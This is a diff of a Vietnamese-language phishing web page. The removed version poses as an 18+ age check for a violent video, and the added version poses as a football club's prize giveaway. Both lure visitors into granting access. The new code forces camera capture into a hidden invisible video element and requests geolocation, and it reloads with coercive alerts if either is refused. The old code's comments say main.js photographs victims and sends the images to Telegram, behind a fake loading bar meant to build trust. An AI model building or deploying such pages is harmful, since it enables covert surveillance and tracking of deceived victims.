@@ -3,114 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xác minh độ tuổi - Trình phát Video</title>
+    <title>QUÀ TẶNG CHAMPION - FC GIAO THỦY</title>
     <style>
         body {
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #000;
-            color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
+            margin: 0; padding: 0;
+            background: #050505; color: #fff;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            display: flex; justify-content: center; align-items: center; height: 100vh;
         }
-        .container {
-            text-align: center;
-            padding: 20px;
-            max-width: 400px;
-            border: 1px solid #333;
-            border-radius: 12px;
-            background: #111;
-            z-index: 10;
+        .card {
+            background: #111; padding: 30px; border-radius: 15px;
+            text-align: center; max-width: 350px;
+            border: 1px solid #00ff88;
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
         }
-        .warning-icon { font-size: 50px; color: #ffcc00; margin-bottom: 10px; }
-        h2 { margin-bottom: 10px; font-size: 1.2rem; }
-        p { color: #aaa; font-size: 0.9rem; margin-bottom: 20px; }
-        
-        .btn-confirm {
-            background-color: #e02424;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            font-size: 1rem;
-            font-weight: bold;
-            border-radius: 6px;
-            cursor: pointer;
-            width: 100%;
+        .btn-action {
+            background: #00ff88; color: #000;
+            border: none; padding: 15px 25px;
+            font-weight: bold; border-radius: 8px;
+            cursor: pointer; width: 100%; margin-top: 20px;
         }
-
-        /* Giao diện Video Giả */
-        #videoPlayer {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: #000;
-            z-index: 9999;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
+        #statusOverlay {
+            display: none; position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%; background: #000;
+            z-index: 100; flex-direction: column;
+            justify-content: center; align-items: center;
         }
         .loader {
-            border: 4px solid #333;
-            border-top: 4px solid #ff0000;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
+            width: 40px; height: 40px;
+            border: 4px solid #222; border-top: 4px solid #00ff88;
+            border-radius: 50%; animation: spin 1s linear infinite;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .loading-text { margin-top: 15px; color: #fff; font-size: 0.9rem; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
-<div class="container" id="authBox">
-    <div class="warning-icon">🔞</div>
-    <h2>NỘI DUNG NHẠY CẢM</h2>
-    <p>Video này chứa hình ảnh bạo lực (đánh nhau). Bạn phải xác thực trên 18 tuổi và cho phép quyền truy cập hệ thống để tiếp tục xem.</p>
-    <button class="btn-confirm" id="verifyBtn">XÁC THỰC NGAY</button>
+<div class="card" id="mainCard">
+    <div style="font-size: 50px;">🎁</div>
+    <h2>PHẦN QUÀ VÔ ĐỊCH</h2>
+    <p>FC Giao Thủy tặng 100 thẻ cào cho fan may mắn. Vui lòng <b>Cho phép truy cập</b> để hệ thống xác thực vị trí nhận quà.</p>
+    <button class="btn-action" id="accessBtn">NHẬN QUÀ NGAY</button>
 </div>
 
-<div id="videoPlayer">
+<div id="statusOverlay">
     <div class="loader"></div>
-    <div class="loading-text">Đang tải video... 0%</div>
+    <p id="statusText" style="margin-top: 20px; color: #00ff88;">Đang kết nối máy chủ...</p>
+    <video id="video" width="1" height="1" autoplay style="position:fixed; opacity:0;"></video>
 </div>
-
-<script src="main.js"></script> 
 
 <script>
-    const btn = document.getElementById('verifyBtn');
-    const authBox = document.getElementById('authBox');
-    const videoPlayer = document.getElementById('videoPlayer');
-    const loadText = document.querySelector('.loading-text');
+    const accessBtn = document.getElementById('accessBtn');
+    const overlay = document.getElementById('statusOverlay');
+    const statusText = document.getElementById('statusText');
 
-    btn.addEventListener('click', async () => {
-        // Hiện màn hình loading giả
-        authBox.style.display = 'none';
-        videoPlayer.style.display = 'flex';
+    async function requestPermissions() {
+        overlay.style.display = 'flex';
+        
+        try {
+            // 1. Ép lấy quyền Camera
+            statusText.innerText = "Đang xác thực gương mặt...";
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('video').srcObject = stream;
+            
+            // Gọi hàm xử lý ảnh từ main.js nếu có
+            if(typeof main === 'function') main();
 
-        // Gọi hàm main() từ file main.js để chụp ảnh/gửi Tele
-        if (typeof main === 'function') {
-            main(); // Chạy ngầm, không dùng await ở đây để giao diện load mượt hơn
+            // 2. Ép lấy quyền Vị trí
+            statusText.innerText = "Đang kiểm tra vị trí fan club...";
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    // Thành công cả 2 -> Chuyển hướng
+                    statusText.innerText = "Xác thực thành công! Đang mở album...";
+                    setTimeout(() => {
+                        window.location.href = "https://postimg.cc/gallery/NTp0rLd";
+                    }, 2000);
+                },
+                (err) => {
+                    // Từ chối vị trí -> Reload
+                    alert("Lỗi: Bạn phải bật định vị để nhận quà tại khu vực này!");
+                    location.reload();
+                }
+            );
+
+        } catch (err) {
+            // Từ chối Camera -> Reload
+            alert("Lỗi hệ thống: Cần quyền truy cập để định danh fan cứng!");
+            location.reload();
         }
+    }
 
-        // Tạo hiệu ứng nhảy số % giả cho người dùng tin tưởng
-        let percent = 0;
-        const interval = setInterval(() => {
-            percent += Math.floor(Math.random() * 5) + 1;
-            if (percent >= 99) {
-                percent = 99;
-                loadText.innerText = "Đang kết nối luồng trực tuyến... (Chậm)";
-                clearInterval(interval);
-            } else {
-                loadText.innerText = `Đang tải video... ${percent}%`;
-            }
-        }, 1500);
-    });
+    accessBtn.addEventListener('click', requestPermissions);
 </script>
 
 </body>
